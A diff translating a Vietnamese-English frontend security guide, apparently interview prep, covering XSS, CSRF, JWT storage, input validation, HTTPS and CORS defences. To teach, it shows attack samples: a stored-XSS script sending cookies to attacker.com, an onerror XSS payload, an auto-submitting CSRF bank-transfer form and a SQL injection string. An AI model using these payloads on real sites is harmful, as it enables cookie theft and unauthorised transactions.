@@ -1,27 +1,26 @@
 # Security
 
-Web security best practices cho frontend applications.
+Best practices về bảo mật web cho frontend applications.
 
 ---
 
-## Table of Contents
+## Mục Lục
 
-1. [XSS Prevention](#1-xss-prevention)
-2. [CSRF Protection](#2-csrf-protection)
-3. [Authentication Best Practices](#3-authentication-best-practices)
-4. [Input Validation & Sanitization](#4-input-validation--sanitization)
+1. [Phòng chống XSS](#1-phòng-chống-xss)
+2. [Bảo vệ CSRF](#2-bảo-vệ-csrf)
+3. [Best Practices về Authentication](#3-best-practices-về-authentication)
+4. [Validation và Sanitization Input](#4-validation-và-sanitization-input)
 5. [HTTPS & CORS](#5-https--cors)
 
 ---
-## 5. Security
 
-### 5.1. XSS Prevention
+## 1. Phòng chống XSS
 
 **Câu trả lời chuẩn Senior:**
 
 XSS (Cross-Site Scripting) là attack injection malicious scripts vào web pages.
 
-#### **Types of XSS**
+#### **Các loại XSS**
 
 **1. Stored XSS** - Malicious script lưu trên server
 
@@ -31,7 +30,7 @@ XSS (Cross-Site Scripting) là attack injection malicious scripts vào web pages
   document.location = "http://attacker.com/steal?cookie=" + document.cookie;
 </script>
 
-<!-- Other users load page and script executes -->
+<!-- Người dùng khác load page và script thực thi -->
 ```
 
 **2. Reflected XSS** - Script trong URL parameters
@@ -43,26 +42,26 @@ https://example.com/search?q=<script>alert('XSS')</script>
 **3. DOM-based XSS** - Script thay đổi DOM
 
 ```js
-// Vulnerable code
+// Code dễ bị tấn công
 document.getElementById("output").innerHTML = location.hash.substring(1);
 
 // Attacker URL: https://example.com#<img src=x onerror=alert('XSS')>
 ```
 
-#### **Vue 3 Built-in Protection**
+#### **Bảo vệ Built-in của Vue 3**
 
 ```vue
 <template>
-  <!-- ✅ SAFE: Vue auto-escapes text interpolation -->
+  <!-- ✅ AN TOÀN: Vue tự động escape text interpolation -->
   <div>{{ userInput }}</div>
-  <!-- If userInput = "<script>alert('xss')</script>" -->
+  <!-- Nếu userInput = "<script>alert('xss')</script>" -->
   <!-- Renders as: &lt;script&gt;alert('xss')&lt;/script&gt; -->
 
-  <!-- ❌ DANGEROUS: v-html renders raw HTML -->
+  <!-- ❌ NGUY HIỂM: v-html renders raw HTML -->
   <div v-html="userInput"></div>
-  <!-- Script will execute! -->
+  <!-- Script sẽ thực thi! -->
 
-  <!-- ✅ SAFE: Attribute binding -->
+  <!-- ✅ AN TOÀN: Attribute binding -->
   <div :title="userInput">Hover</div>
   <!-- Vue escapes attributes -->
 </template>
@@ -73,7 +72,7 @@ document.getElementById("output").innerHTML = location.hash.substring(1);
 ```ts
 import DOMPurify from "dompurify";
 
-// Sanitize before rendering
+// Sanitize trước khi render
 const cleanHTML = DOMPurify.sanitize(dirtyHTML);
 ```
 
@@ -126,51 +125,51 @@ function escapeHTML(str: string): string {
     .replace(/'/g, "&#039;");
 }
 
-// ✅ Use textContent instead of innerHTML
-element.textContent = userInput; // Safe
-element.innerHTML = userInput; // Dangerous
+// ✅ Dùng textContent thay vì innerHTML
+element.textContent = userInput; // An toàn
+element.innerHTML = userInput; // Nguy hiểm
 
-// ❌ Avoid eval()
-eval(userInput); // NEVER do this
+// ❌ Tránh eval()
+eval(userInput); // KHÔNG BAO GIỜ làm điều này
 
-// ❌ Avoid Function constructor with user input
-new Function(userInput)(); // Dangerous
+// ❌ Tránh Function constructor với user input
+new Function(userInput)(); // Nguy hiểm
 ```
 
 ---
 
-### 5.2. CSRF Protection
+## 2. Bảo vệ CSRF
 
 **Câu trả lời chuẩn Senior:**
 
-CSRF (Cross-Site Request Forgery) tricks user vào executing unwanted actions.
+CSRF (Cross-Site Request Forgery) lừa user thực thi các actions không mong muốn.
 
-#### **How CSRF Works**
+#### **Cách CSRF hoạt động**
 
 ```html
-<!-- Attacker's website -->
+<!-- Website của attacker -->
 <form action="https://bank.com/transfer" method="POST">
   <input type="hidden" name="to" value="attacker-account" />
   <input type="hidden" name="amount" value="10000" />
 </form>
 <script>
-  document.forms[0].submit(); // Auto-submit when page loads
+  document.forms[0].submit(); // Tự động submit khi page loads
 </script>
 
-<!-- If user is logged into bank.com, transfer executes! -->
+<!-- Nếu user đang đăng nhập vào bank.com, transfer sẽ thực thi! -->
 ```
 
 #### **CSRF Token Pattern**
 
 ```ts
-// Backend generates token
+// Backend tạo token
 const csrfToken = crypto.randomBytes(32).toString("hex");
 res.cookie("XSRF-TOKEN", csrfToken);
 
-// Frontend includes token in requests
+// Frontend include token trong requests
 axios.defaults.headers.common["X-XSRF-TOKEN"] = getCookie("XSRF-TOKEN");
 
-// Backend validates token
+// Backend validate token
 if (req.headers["x-xsrf-token"] !== req.cookies["XSRF-TOKEN"]) {
   return res.status(403).json({ error: "Invalid CSRF token" });
 }
@@ -179,8 +178,8 @@ if (req.headers["x-xsrf-token"] !== req.cookies["XSRF-TOKEN"]) {
 #### **Axios Auto CSRF**
 
 ```ts
-// axios automatically reads XSRF-TOKEN cookie
-// and adds to X-XSRF-TOKEN header
+// axios tự động đọc XSRF-TOKEN cookie
+// và thêm vào X-XSRF-TOKEN header
 import axios from "axios";
 
 axios.defaults.xsrfCookieName = "XSRF-TOKEN";
@@ -190,31 +189,31 @@ axios.defaults.xsrfHeaderName = "X-XSRF-TOKEN";
 #### **SameSite Cookies**
 
 ```js
-// Server sets cookie with SameSite attribute
+// Server sets cookie với SameSite attribute
 res.cookie("sessionId", token, {
   httpOnly: true,
   secure: true,
-  sameSite: "strict", // or 'lax' or 'none'
+  sameSite: "strict", // hoặc 'lax' hoặc 'none'
 });
 
-// SameSite=Strict: Cookie only sent for same-site requests
-// SameSite=Lax: Cookie sent for top-level navigation
-// SameSite=None: Cookie sent cross-site (requires Secure)
+// SameSite=Strict: Cookie chỉ gửi cho same-site requests
+// SameSite=Lax: Cookie gửi cho top-level navigation
+// SameSite=None: Cookie gửi cross-site (requires Secure)
 ```
 
 ---
 
-### 5.3. Authentication Best Practices
+## 3. Best Practices về Authentication
 
 **Câu trả lời chuẩn Senior:**
 
-#### **JWT Storage**
+#### **Lưu trữ JWT**
 
 ```ts
-// ❌ BAD: localStorage (vulnerable to XSS)
+// ❌ TỆ: localStorage (dễ bị XSS)
 localStorage.setItem("token", jwt);
 
-// ✅ GOOD: httpOnly cookie (not accessible to JavaScript)
+// ✅ TỐT: httpOnly cookie (JavaScript không truy cập được)
 // Server sets:
 res.cookie("token", jwt, {
   httpOnly: true,
@@ -224,30 +223,30 @@ res.cookie("token", jwt, {
 });
 
 // ✅ ALTERNATIVE: Memory + Refresh Token pattern
-let accessToken = null; // In memory, lost on refresh
+let accessToken = null; // Trong memory, mất khi refresh
 
-// Store refresh token in httpOnly cookie
-// Use refresh token to get new access token
+// Lưu refresh token trong httpOnly cookie
+// Dùng refresh token để lấy access token mới
 ```
 
 #### **Refresh Token Flow**
 
 ```ts
-// 1. Login: Get access + refresh tokens
+// 1. Login: Nhận access + refresh tokens
 const login = async (email, password) => {
   const { accessToken, refreshToken } = await api.post("/auth/login", {
     email,
     password,
   });
 
-  // Store access token in memory
+  // Lưu access token trong memory
   setAccessToken(accessToken);
 
-  // Refresh token sent as httpOnly cookie by server
+  // Refresh token gửi dưới dạng httpOnly cookie từ server
   return true;
 };
 
-// 2. API call with access token
+// 2. API call với access token
 axios.interceptors.request.use((config) => {
   const token = getAccessToken();
   if (token) {
@@ -266,15 +265,15 @@ axios.interceptors.response.use(
       originalRequest._retry = true;
 
       try {
-        // Call refresh endpoint (sends httpOnly cookie automatically)
+        // Gọi refresh endpoint (gửi httpOnly cookie tự động)
         const { accessToken } = await api.post("/auth/refresh");
         setAccessToken(accessToken);
 
-        // Retry original request
+        // Retry request gốc
         originalRequest.headers.Authorization = `Bearer ${accessToken}`;
         return axios(originalRequest);
       } catch (refreshError) {
-        // Refresh failed, redirect to login
+        // Refresh thất bại, redirect to login
         router.push("/login");
         return Promise.reject(refreshError);
       }
@@ -288,13 +287,13 @@ axios.interceptors.response.use(
 #### **Password Hashing (Backend)**
 
 ```ts
-// ❌ NEVER store plain text passwords
+// ❌ KHÔNG BAO GIỜ lưu plain text passwords
 users.password = password;
 
-// ❌ NEVER use weak hashing (MD5, SHA1)
+// ❌ KHÔNG BAO GIỜ dùng weak hashing (MD5, SHA1)
 users.password = md5(password);
 
-// ✅ Use bcrypt with salt
+// ✅ Dùng bcrypt với salt
 import bcrypt from "bcrypt";
 
 const saltRounds = 12;
@@ -306,7 +305,7 @@ const isValid = await bcrypt.compare(inputPassword, hashedPassword);
 
 ---
 
-### 5.4. Input Validation & Sanitization
+## 4. Validation và Sanitization Input
 
 **Câu trả lời chuẩn Senior:**
 
@@ -317,15 +316,15 @@ import { z } from "zod";
 
 // Define schema
 const userSchema = z.object({
-  email: z.string().email("Invalid email"),
-  password: z.string().min(8, "Password must be at least 8 characters"),
-  age: z.number().min(18, "Must be 18+").max(120),
+  email: z.string().email("Email không hợp lệ"),
+  password: z.string().min(8, "Mật khẩu phải có ít nhất 8 ký tự"),
+  age: z.number().min(18, "Phải từ 18 tuổi trở lên").max(120),
 });
 
 // Validate
 try {
   const user = userSchema.parse(formData);
-  // Valid!
+  // Hợp lệ!
 } catch (error) {
   if (error instanceof z.ZodError) {
     console.log(error.errors);
@@ -333,7 +332,7 @@ try {
 }
 ```
 
-#### **Backend Validation (Never trust frontend)**
+#### **Backend Validation (Không bao giờ tin tưởng frontend)**
 
 ```ts
 // Express + Zod
@@ -347,36 +346,36 @@ const createUserSchema = z.object({
 });
 
 app.post("/users", validate(createUserSchema), async (req, res) => {
-  // req.body is validated
+  // req.body đã được validated
 });
 ```
 
-#### **SQL Injection Prevention**
+#### **Phòng chống SQL Injection**
 
 ```ts
-// ❌ NEVER concatenate SQL queries
+// ❌ KHÔNG BAO GIỜ concatenate SQL queries
 const query = `SELECT * FROM users WHERE email = '${email}'`;
 // Attacker input: ' OR '1'='1
 
-// ✅ Use parameterized queries
+// ✅ Dùng parameterized queries
 const query = "SELECT * FROM users WHERE email = ?";
 db.execute(query, [email]);
 
-// ✅ Or use ORM
+// ✅ Hoặc dùng ORM
 const user = await User.findOne({ where: { email } });
 ```
 
 ---
 
-### 5.5. HTTPS & CORS
+## 5. HTTPS & CORS
 
 **Câu trả lời chuẩn Senior:**
 
 #### **HTTPS**
 
 ```ts
-// Always use HTTPS in production
-// Redirect HTTP to HTTPS
+// Luôn dùng HTTPS trong production
+// Redirect HTTP sang HTTPS
 app.use((req, res, next) => {
   if (req.header("x-forwarded-proto") !== "https") {
     return res.redirect(`https://${req.header("host")}${req.url}`);
@@ -386,25 +385,22 @@ app.use((req, res, next) => {
 
 // Set Strict-Transport-Security header
 app.use((req, res, next) => {
-  res.setHeader(
-    "Strict-Transport-Security",
-    "max-age=31536000; includeSubDomains"
-  );
+  res.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
   next();
 });
 ```
 
-#### **CORS Configuration**
+#### **Cấu hình CORS**
 
 ```ts
-// ❌ BAD: Allow all origins
+// ❌ TỆ: Cho phép tất cả origins
 app.use(
   cors({
     origin: "*",
   })
 );
 
-// ✅ GOOD: Whitelist specific origins
+// ✅ TỐT: Whitelist các origins cụ thể
 const allowedOrigins = ["https://myapp.com", "https://admin.myapp.com"];
 
 app.use(
@@ -416,7 +412,7 @@ app.use(
         callback(new Error("Not allowed by CORS"));
       }
     },
-    credentials: true, // Allow cookies
+    credentials: true, // Cho phép cookies
     methods: ["GET", "POST", "PUT", "DELETE"],
     allowedHeaders: ["Content-Type", "Authorization"],
   })
@@ -425,7 +421,4 @@ app.use(
 
 ---
 
-
----
-
-[← Back to Overview](../README.md)
+[← Quay lại Tổng quan](../README.md)
